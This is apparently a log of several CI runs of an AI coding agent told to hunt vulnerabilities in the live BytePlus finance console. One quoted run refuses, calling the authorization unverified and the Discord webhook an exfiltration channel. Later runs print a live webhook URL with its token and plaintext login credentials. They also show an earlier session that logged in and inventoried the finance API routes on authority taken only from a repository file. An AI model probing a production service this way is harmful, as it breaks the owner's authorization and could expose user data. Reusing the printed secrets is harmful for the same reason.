@@ -1057,3 +1057,2223 @@ result/scope.md
 I completed preflight but deliberately did **not** begin testing, and wrote `result/BLOCKED.md` per AGENT.md's own stop conditions.
 
 Reason: `console.byteplus.com` is a live third-party production service, and authorization is only asserted by a file in this repo. Public checks show no BytePlus bug bounty/VDP covering it, the repo is owned by a personal account, and `data/targets.txt` instructs sending findings to a personal Discord webhook — an exfiltration channel, not a legitimate disclosure path. I sent no requests to the target, attempted no logins, made no vulnerability claims, and did not contact the webhook. Details are in `result/BLOCKED.md`, `result/scope.md`, and `result/SUMMARY.md`.
+
+===== OPENCODE RUN 41023369180 2026-10-30T07:59:10Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+I'll read the file first.
+[0m→ [0mRead skills/AGENT.md
+[0m
+[0m$ [0mpwd; echo "---"; ls -la; echo "--- data ---"; ls -la data/ 2>/dev/null; echo "--- creds ---"; ls -la creds/ 2>/dev/null; echo "--- result ---"; ls -la result/ 2>/dev/null; echo "--- tools ---"; ls -la tools/ 2>/dev/null; echo "--- skills ---"; ls -la skills/ 2>/dev/null
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+---
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 .github
+-rw-r--r--  1 runner runner  355 Oct 30 07:58 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 data
+-rw-r--r--  1 runner runner  332 Oct 30 07:59 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 07:58 vulnebleti
+--- data ---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner  268 Oct 30 07:58 targets.txt
+--- creds ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 07:58 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 07:58 test-account.txt
+--- result ---
+total 44
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner 2846 Oct 30 07:58 BLOCKED.md
+-rw-r--r--  1 runner runner  972 Oct 30 07:58 SUMMARY.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 07:58 confirmed-vuln.txt
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 inventory
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 logs
+-rw-r--r--  1 runner runner 2490 Oct 30 07:58 scope.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 server-side
+--- tools ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 07:58 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 07:58 cmd.txt
+--- skills ---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner     0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 07:58 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 07:58 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 07:58 server-side-skill.md
+[0m
+I've read the instructions. Starting the session startup sequence.
+[0m$ [0mcommand -v opencode curl git node npx python3 google-chrome-stable google-chrome chromium chromium-browser 2>/dev/null; echo "---versions---"; node --version 2>/dev/null; python3 --version 2>/dev/null; curl --version 2>/dev/null | head -1
+/home/runner/.opencode/bin/opencode
+/usr/bin/curl
+/usr/bin/git
+/opt/hostedtoolcache/node/22.23.4/x64/bin/node
+/opt/hostedtoolcache/node/22.23.4/x64/bin/npx
+/usr/bin/python3
+/usr/bin/google-chrome-stable
+/usr/bin/google-chrome
+/usr/bin/chromium
+/usr/bin/chromium-browser
+---versions---
+v22.23.4
+Python 3.14.4
+curl 8.18.0 (x86_64-pc-linux-gnu) libcurl/8.18.0 OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.68.0 librtmp/2.3 mit-krb5/1.22.1 OpenLDAP/2.6.10
+[0m
+[0m$ [0mecho "=== data/targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== .gitignore ==="; cat .gitignore
+=== data/targets.txt ===
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== creds/README.md ===
+# creds/
+
+This public repository intentionally contains disposable test credentials.
+
+- `test-account.txt` — public test login for authorized targets.
+
+Test-account emails, passwords, cookies, and tokens may appear in `result/`
+reports, logs, and evidence. They are disposable and intentionally public.
+
+Never add real, valuable, or third-party credentials to this directory. If real
+credentials are ever needed, use GitHub Actions secrets and do not commit them.
+
+=== creds/test-account.txt ===
+byteplus console test login creds
+
+https://console.byteplus.com/auth/login/
+
+test account a
+
+```
+adoringjepsen1@fearlessmails.com
+Acd3423@#345566
+```
+
+test account b
+```
+testt456
+Acd3423@#345
+```
+
+=== tools/cmd.txt ===
+opencode run --model opencode/deepseek-v4.1-flash-free "Read \`skills/AGENT.md\` and follow all instructions exactly."
+
+=== opencode.json ===
+{
+  "$schema": "https://opencode.ai/config.json",
+  "autoupdate": false,
+  "permission": "allow",
+  "share": "disabled",
+  "mcp": {
+    "chrome-devtools": {
+      "type": "local",
+      "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        "--browser-url=http://127.0.0.1:9222"
+      ]
+    }
+  }
+}
+
+=== .gitignore ===
+# Secrets and credentials
+creds/*
+!creds/.gitkeep
+!creds/README.md
+!creds/test-account.txt
+.env
+.env.*
+*.pem
+*.key
+
+# Generated by tools/chrome-mcp-start.sh for the current environment
+/opencode.json
+
+# Local browser/runtime artifacts
+/tmp/
+/browser-profile/
+chrome-mcp-profile/
+
+# Node
+node_modules/
+npm-debug.log*
+
+# OS/editor noise
+.DS_Store
+Thumbs.db
+[0m
+[0m$ [0mecho "=== result/BLOCKED.md ==="; cat result/BLOCKED.md; echo; echo "=== result/SUMMARY.md ==="; cat result/SUMMARY.md; echo; echo "=== result/scope.md ==="; cat result/scope.md; echo; echo "=== result/confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt; echo; echo "=== result/logs ==="; find result/logs -type f -maxdepth 3 -print -exec cat {} \;
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_18bd215890017TkosU3fgVl44e
+
+
+===== OPENCODE RUN 41022487138 2026-10-30T07:50:34Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+I'll read the file first.
+[0m→ [0mRead skills/AGENT.md
+I'll follow the AGENT.md workflow. First, preflight and inspect the repository.
+[0m
+[0m$ [0mecho "---targets.txt---"; cat data/targets.txt 2>&1; echo "---all data files---"; for f in data/*; do echo "=== $f ==="; cat "$f" 2>&1; done
+---targets.txt---
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+---all data files---
+=== data/targets.txt ===
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+[0m
+[0m$ [0mpwd && ls -la && echo "---DATA---" && ls -la data/ 2>&1 && echo "---CREDS---" && ls -la creds/ 2>&1 && echo "---RESULT---" && ls -la result/ 2>&1 && echo "---TOOLS---" && ls -la tools/ 2>&1 && echo "---SKILLS---" && ls -la skills/ 2>&1
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:49 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:50 .github
+-rw-r--r--  1 runner runner  355 Oct 30 07:50 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 data
+-rw-r--r--  1 runner runner  332 Oct 30 07:50 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 07:50 vulnebleti
+---DATA---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner  268 Oct 30 07:50 targets.txt
+---CREDS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 07:50 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 07:50 test-account.txt
+---RESULT---
+total 32
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 07:50 confirmed-vuln.txt
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 inventory
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 logs
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 server-side
+---TOOLS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 07:50 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 07:50 cmd.txt
+---SKILLS---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner     0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 07:50 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 07:50 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 07:50 server-side-skill.md
+[0m
+[0m$ [0mecho "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt; echo; echo "=== result tree ==="; find result -type f | head -100; echo "=== logs ==="; ls -la result/logs/ result/inventory/ result/findings/ result/client-side/ result/server-side/ 2>&1
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+
+=== result tree ===
+result/logs/target-state.txt
+result/logs/opencode.log
+result/logs/targets.used.txt
+result/logs/targets.sha256
+result/.gitkeep
+result/confirmed-vuln.txt
+=== logs ===
+result/client-side/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/findings/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/inventory/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/logs/:
+total 24
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r-- 1 runner runner 3650 Oct 30 07:50 opencode.log
+-rw-r--r-- 1 runner runner  249 Oct 30 07:50 target-state.txt
+-rw-r--r-- 1 runner runner   65 Oct 30 07:50 targets.sha256
+-rw-r--r-- 1 runner runner  268 Oct 30 07:50 targets.used.txt
+
+result/server-side/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+[0m
+[0m$ [0mecho "=== creds/README.md ==="; cat creds/README.md; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo "=== opencode.json ==="; cat opencode.json; echo "=== git log ==="; git log --oneline -20; echo "=== git status ==="; git status
+=== creds/README.md ===
+# creds/
+
+This public repository intentionally contains disposable test credentials.
+
+- `test-account.txt` — public test login for authorized targets.
+
+Test-account emails, passwords, cookies, and tokens may appear in `result/`
+reports, logs, and evidence. They are disposable and intentionally public.
+
+Never add real, valuable, or third-party credentials to this directory. If real
+credentials are ever needed, use GitHub Actions secrets and do not commit them.
+=== creds/test-account.txt ===
+byteplus console test login creds
+
+https://console.byteplus.com/auth/login/
+
+test account a
+
+```
+adoringjepsen1@fearlessmails.com
+Acd3423@#345566
+```
+
+test account b
+```
+testt456
+Acd3423@#345
+```
+=== tools/cmd.txt ===
+opencode run --model opencode/deepseek-v4.1-flash-free "Read \`skills/AGENT.md\` and follow all instructions exactly."
+=== opencode.json ===
+{
+  "$schema": "https://opencode.ai/config.json",
+  "autoupdate": false,
+  "permission": "allow",
+  "share": "disabled",
+  "mcp": {
+    "chrome-devtools": {
+      "type": "local",
+      "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        "--browser-url=http://127.0.0.1:9222"
+      ]
+    }
+  }
+}
+=== git log ===
+5a6f018 Update targets.txt
+0e03903 scan: results 2026-10-30T07:41:51Z
+9e8eb94 scan: results 2026-10-30T07:37:42Z
+4fd615e scan: results 2026-10-30T07:07:51Z
+ae92c56 scan: results 2026-10-30T06:32:44Z
+0344e65 Update targets.txt
+07ed75f scan: results 2026-10-30T05:10:43Z
+4e843ac scan: results 2026-10-30T04:25:07Z
+ceef96c Update targets.txt
+1b25949 scan: results 2026-10-29T22:43:39Z
+641c389 scan: results 2026-10-29T14:39:34Z
+e38d395 Update targets.txt
+da1e00b Update targets.txt
+25e7fc4 scan: results 2026-10-29T14:18:18Z
+6560caa Update targets.txt
+308856d scan: results 2026-10-29T12:41:33Z
+9e22d56 scan: results 2026-10-29T12:22:09Z
+15c4e40 scan: results 2026-10-29T12:09:20Z
+1940ea2 Update targets.txt
+e3620eb scan: results 2026-10-29T11:22:25Z
+=== git status ===
+On branch main
+Your branch is up to date with 'origin/main'.
+
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+	deleted:    result/inventory/endpoints.md
+	deleted:    result/inventory/routes.md
+	deleted:    result/logs/agent-exit-code.txt
+	deleted:    result/logs/agent-watchdog.txt
+	deleted:    result/logs/auto-restart-requested.txt
+	deleted:    result/logs/diagnostics-index.txt
+	deleted:    result/logs/opencode-reinstall-20261030T063017Z.log
+	deleted:    result/logs/opencode-reinstall-20261030T070525Z.log
+	deleted:    result/logs/opencode-reinstall-20261030T073516Z.log
+	modified:   result/logs/opencode.log
+	deleted:    result/logs/opencode/41012332097/chrome-mcp.log
+	deleted:    result/logs/opencode/41012332097/diagnostics-index.txt
+	deleted:    result/logs/opencode/41012332097/opencode.log
+	deleted:    result/logs/opencode/41014704909/chrome-mcp.log
+	deleted:    result/logs/opencode/41014704909/diagnostics-index.txt
+	deleted:    result/logs/opencode/41014704909/opencode.log
+	deleted:    result/logs/opencode/41018191411/chrome-mcp.log
+	deleted:    result/logs/opencode/41018191411/diagnostics-index.txt
+	deleted:    result/logs/opencode/41018191411/opencode.log
+	deleted:    result/logs/opencode/41021243777/chrome-mcp.log
+	deleted:    result/logs/opencode/41021243777/diagnostics-index.txt
+	deleted:    result/logs/opencode/41021243777/opencode.log
+	deleted:    result/logs/session.md
+	modified:   result/logs/target-state.txt
+	modified:   result/logs/targets.sha256
+	modified:   result/logs/targets.used.txt
+	deleted:    result/scope.md
+
+no changes added to commit (use "git add" and/or "git commit -a")
+[0m
+[0m$ [0mecho "=== target-state ==="; cat result/logs/target-state.txt; echo "=== sha ==="; cat result/logs/targets.sha256; echo "=== targets.used ==="; cat result/logs/targets.used.txt; echo "=== opencode.log ==="; sed -n '1,120p' result/logs/opencode.log
+=== target-state ===
+run_id=41022487138
+event=workflow_dispatch
+timestamp=2026-10-30T07:50:29Z
+target_hash=8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+previous_hash=55501c5c8e8103e9562a0db40575cd183ddcecb982818435cec4a449a225d25d
+decision=reset
+---
+=== sha ===
+8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+=== targets.used ===
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+=== opencode.log ===
+
+===== OPENCODE RUN 41022487138 2026-10-30T07:50:34Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+I'll read the file first.
+[0m→ [0mRead skills/AGENT.md
+I'll follow the AGENT.md workflow. First, preflight and inspect the repository.
+[0m
+[0m$ [0mecho "---targets.txt---"; cat data/targets.txt 2>&1; echo "---all data files---"; for f in data/*; do echo "=== $f ==="; cat "$f" 2>&1; done
+---targets.txt---
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+---all data files---
+=== data/targets.txt ===
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+[0m
+[0m$ [0mpwd && ls -la && echo "---DATA---" && ls -la data/ 2>&1 && echo "---CREDS---" && ls -la creds/ 2>&1 && echo "---RESULT---" && ls -la result/ 2>&1 && echo "---TOOLS---" && ls -la tools/ 2>&1 && echo "---SKILLS---" && ls -la skills/ 2>&1
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:49 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:50 .github
+-rw-r--r--  1 runner runner  355 Oct 30 07:50 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 data
+-rw-r--r--  1 runner runner  332 Oct 30 07:50 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 07:50 vulnebleti
+---DATA---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner  268 Oct 30 07:50 targets.txt
+---CREDS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 07:50 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 07:50 test-account.txt
+---RESULT---
+total 32
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:50 .gitkeep
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 07:50 confirmed-vuln.txt
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 inventory
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 logs
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 server-side
+---TOOLS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:50 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 07:50 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 07:50 cmd.txt
+---SKILLS---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 07:50 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 07:50 ..
+-rw-r--r--  1 runner runner     0 Oct 30 07:50 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 07:50 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 07:50 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 07:50 server-side-skill.md
+[0m
+[0m$ [0mecho "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt; echo; echo "=== result tree ==="; find result -type f | head -100; echo "=== logs ==="; ls -la result/logs/ result/inventory/ result/findings/ result/client-side/ result/server-side/ 2>&1
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+
+=== result tree ===
+result/logs/target-state.txt
+result/logs/opencode.log
+result/logs/targets.used.txt
+result/logs/targets.sha256
+result/.gitkeep
+result/confirmed-vuln.txt
+=== logs ===
+result/client-side/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/findings/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/inventory/:
+total 8
+drwxr-xr-x 2 runner runner 4096 Oct 30 07:50 .
+drwxr-xr-x 7 runner runner 4096 Oct 30 07:50 ..
+
+result/logs/:
+[0m
+[0m$ [0mecho "=== files at HEAD in result/findings ==="; git ls-tree -r --name-only HEAD -- result/findings | head -100; echo "=== prior SUMMARY ==="; git show HEAD:result/SUMMARY.md 2>&1 | head -120
+=== files at HEAD in result/findings ===
+=== prior SUMMARY ===
+fatal: path 'result/SUMMARY.md' does not exist in 'HEAD'
+[0m
+[0m$ [0mecho "=== prior confirmed-vuln at HEAD ==="; git show HEAD:result/confirmed-vuln.txt 2>&1 | head -80; echo "=== prior scope.md at HEAD ==="; git show HEAD:result/scope.md 2>&1 | head -80; echo "=== prior routes ==="; git show HEAD:result/inventory/routes.md 2>&1 | head -60; echo "=== prior endpoints ==="; git show HEAD:result/inventory/endpoints.md 2>&1 | head -60
+=== prior confirmed-vuln at HEAD ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+=== prior scope.md at HEAD ===
+# Scope
+
+## User Instructions
+
+From `data/targets.txt`:
+
+- Target: `https://console.byteplus.com/finance/`
+- Test all sub-routes under `/finance/`.
+- Keep the progress report updated after completing every route so a later
+  session can continue.
+- Do not ask questions; make reasonable decisions independently.
+- First create two test accounts on this target subdomain and save credentials.
+  If account creation is impossible, test only unauthenticated endpoints.
+- If a confirmed vulnerability is found, the operator asked for a direct Discord
+  webhook notification.
+- Hint: "Their have one confirmed valid bug so also find out that."
+
+## How the instructions affect the plan
+
+- Scope is the URL list `https://console.byteplus.com/finance/` plus only its
+  sub-routes and the same-origin authentication components required to reach
+  them (the `/signin/login` flow and its same-origin APIs).
+- `creds/test-account.txt` already provides two BytePlus console test logins;
+  those are used instead of creating new accounts where login succeeds.
+- The direct Discord-write request is not followed. AGENT.md Section 9 and the
+  CI workflow design route confirmed findings through `result/confirmed-vuln.txt`.
+  Sending unverified data to a webhook would violate the evidence rules. This is
+  documented, not actioned.
+- No scope expansion to non-`/finance/` console modules, other byteplus.com
+  subdomains, or third-party origins.
+
+## Authorization source / assumptions
+
+- `data/targets.txt` is treated as the authorization record for this repository
+  run (AGENT.md Sections 2, 6).
+- Only non-destructive, read-first testing is performed. Test-owned data only.
+
+## In scope
+
+- `https://console.byteplus.com/finance/` and its sub-routes.
+- Same-origin login/auth components required to access `/finance/`.
+- Same-origin JavaScript and API endpoints needed to exercise `/finance/`.
+
+## Out of scope
+
+- Other console modules (e.g. `/iam`, `/user`, `/ark`, `/order`) except where a
+  request is required by the `/finance/` UI itself.
+- Other `*.byteplus.com` subdomains and third-party origins.
+- Real user data / real accounts.
+=== prior routes ===
+# Finance Route Inventory
+
+Target: `https://console.byteplus.com/finance/`
+Auth context: test account A (`adoringjepsen1@fearlessmails.com`, account 3000823185, test-user-123)
+
+| Route | UI label | Status | Notes |
+|---|---|---|---|
+| /finance/overview | Overview | tested (baseline) | Loads bill summary APIs |
+| /finance/bill/detail | Bill details | tested (baseline) | /api/top/bill/... endpoints captured |
+| /finance/bill/tag | Bill tags | pending | |
+| /finance/bill/split-bill | Split bill | pending | |
+| /finance/bill/cost-bill | Cost bill | pending | |
+| /finance/bill/cost-analyse | Cost analysis | pending | |
+| /finance/bill/report | Reports | pending | |
+| /finance/order | Order management | pending | |
+| /finance/renew | Renewal management | pending | |
+| /finance/unsubscribe | Unsubscription management | pending | |
+| /finance/instance-manage | Instance management | pending | |
+| /finance/resource-package | Resource package | pending | |
+| /finance/saving-plan | Savings Plans | pending | |
+| /finance/opening-service/:Product | Opening service | pending | Param route |
+| /finance/payment/transactions | Transactions | pending | |
+| /finance/payment/make-payment | Make payment | pending | |
+| /finance/payment/payment-methods | Payment methods | pending | |
+| /finance/coupon | Coupon | pending | |
+| /finance/pickup-coupon | Pickup voucher management | pending | |
+| /finance/invoice-manage | Invoices | pending | |
+| /finance/busniess-finance/relation | Corporate finance relation | pending | |
+| /finance/contract-discount | Business discount management | pending | |
+| /finance/contract | Contract management | pending | |
+| /finance/export | Export Record | pending | |
+
+Route list extracted from `.volc-menu` `path` attributes (route IDs).
+=== prior endpoints ===
+# Finance API Endpoint Inventory
+
+All endpoints are same-origin `https://console.byteplus.com`. Auth = test account session.
+Captured from `/finance/overview` and `/finance/bill/detail`.
+
+| Method | Path | Params | Auth | Status | Notes |
+|---|---|---|---|---|---|
+| GET | /api/financial/const/getExpenseConfigForFE | - | user | tested negative | Returns FE feature flags |
+| GET | /api/financial/trade/HasArrearsAlert | - | user | captured | |
+| GET | /api/financial/qualification/GetWhitelistShortTermProducts | - | user | captured | |
+| GET | /api/top/account_verify/ap-southeast-1/2018-01-01/GetProfileInfo | - | user | captured | Returns AccountId (3000823185 for A, 3001021825 for B) |
+| GET | /api/top/bill/ap-singapore-1/2020-01-01/GetFilterInfoForBillDetail | BillPeriodBeginStr, BillPeriodEndStr | user | captured | |
+| GET | /api/top/bill/ap-singapore-1/2020-01-01/ListBcProductSummaryOpen | BillPeriodBeginStr, BillPeriodEndStr, Limit, Offset | user | captured | |
